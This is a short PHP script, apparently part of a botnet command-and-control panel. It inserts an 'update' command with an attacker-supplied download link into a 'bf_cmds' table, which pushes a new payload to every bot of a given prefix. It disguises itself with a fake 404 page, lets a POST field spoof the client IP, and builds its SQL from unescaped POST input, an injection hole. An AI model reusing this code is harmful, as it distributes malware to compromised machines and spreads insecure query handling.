<?php

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

if(!empty($_POST['remote_ip'])){
	$_SERVER['REMOTE_ADDR'] = $_POST['remote_ip'];
}elseif(!empty($_SERVER["HTTP_X_REAL_IP"])){
	$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_X_REAL_IP"];
}

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

if($config['autocmd'] != '1'){	print('off');
	exit;
}

if(!preg_match('~^([a-zA-Z]+)$~', $_POST['prefix'])){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}

if(!empty($_POST['prefix']) && !empty($_POST['link'])){	include_once($dir . 'includes/functions.get_config.php');
	$cfg_db = get_config();
	$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
	if(mysqli_connect_errno()) print('not mysql');
	$mysqli->real_query("SET NAMES utf8");
	$mysqli->real_query('delete from bf_cmds where (id = \'AutoUpdate\') LIMIT 1');
	$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, online, cmd, str, post_id) VALUES ('".$_POST['prefix']."', '*', '1', 'update ".$_POST['link']."', 'AutoUpdate', '-1')");
	if(!empty($mysqli->insert_id)){		print('OK!');
	}
}else{	print('not ok');
}

?>